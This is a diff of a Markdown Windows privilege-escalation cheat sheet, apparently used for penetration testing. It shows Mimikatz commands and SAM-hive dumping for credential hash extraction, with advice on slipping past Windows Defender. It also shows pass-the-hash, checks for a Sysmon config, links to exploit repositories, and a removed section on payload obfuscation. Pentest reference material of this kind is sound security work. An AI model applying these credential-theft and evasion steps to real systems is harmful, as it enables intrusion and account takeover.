@@ -133,7 +133,7 @@ ____
 https://lolbas-project.github.io/#   
 
 Windows 10 Exploits 
-https://github.com/nu11secur1ty/Windows10Exploits
+https://github.com/nu11secur1ty/Windows10Exploits    
 
 ## Privilege Exploits 
 [Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
@@ -313,7 +313,7 @@ Manually:
      lsadump.py sys_backup.hiv sec_backup.hiv
 
 
-Extract hashes with Mimikatz (Windows Defender will catch this):    
+Extract hashes with Mimikatz (Windows Defender will catch this so it's better to use the below method):    
 
      privilege::debug 
      token::elevate 
@@ -330,7 +330,6 @@ Dump lsass, then use Mimikatz to extract hashes locally (Windows Defender should
 *then crack hashes or use pass the hash to login* 
 [Online hash cracker](https://crackstation.net/) 
      
-
 ## Kernel exploits   
 Check system architechure:
 
@@ -515,12 +514,7 @@ Add this reg key:
      PS > Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  
      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational   
      findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*      #if sysmon is installed, try to read config file    
-
- ### Obfuscate Payloads
-Use wrapper files to call static executables (such as nc) 
-[Chameleon](https://github.com/klezVirus/chameleon): Powershell script obfuscator  
-
-     
+ 
  ____
  
 # Resources
